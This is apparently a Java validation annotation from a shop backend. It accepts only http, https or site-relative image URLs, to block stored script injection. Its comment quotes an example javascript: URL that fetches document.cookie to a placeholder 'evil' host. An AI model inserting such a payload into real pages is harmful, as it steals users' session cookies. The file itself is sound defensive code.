package com.backend.compras.shared.validacion;

import java.lang.annotation.Documented;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

import jakarta.validation.Constraint;
import jakarta.validation.ConstraintValidator;
import jakarta.validation.ConstraintValidatorContext;
import jakarta.validation.Payload;

/**
 * A03: la URL acaba en un atributo `src` del navegador, así que solo se admiten
 * http, https o una ruta del propio sitio.
 *
 * Sin esto, un administrador (o cualquiera que consiga su token) podía guardar
 * `javascript:fetch('//evil/'+document.cookie)` como imagen de producto. Angular
 * sanea el binding y lo neutraliza al pintarlo, pero el valor quedaba
 * almacenado y viajaba a cualquier otro consumidor de la API — un informe, una
 * app móvil o una plantilla de correo no tienen por qué tener esa defensa.
 *
 * Se rechaza con 400 en vez de descartar la imagen en silencio: si el admin se
 * equivoca al pegar la URL, tiene que enterarse.
 */
@Documented
@Constraint(validatedBy = UrlSegura.Validador.class)
@Target({ ElementType.FIELD, ElementType.PARAMETER, ElementType.TYPE_USE })
@Retention(RetentionPolicy.RUNTIME)
public @interface UrlSegura {

    String message() default "La URL debe empezar por http://, https:// o /";

    Class<?>[] groups() default {};

    Class<? extends Payload>[] payload() default {};

    class Validador implements ConstraintValidator<UrlSegura, String> {

        @Override
        public boolean isValid(String valor, ConstraintValidatorContext contexto) {
            return Saneador.urlSegura(valor);
        }
    }
}
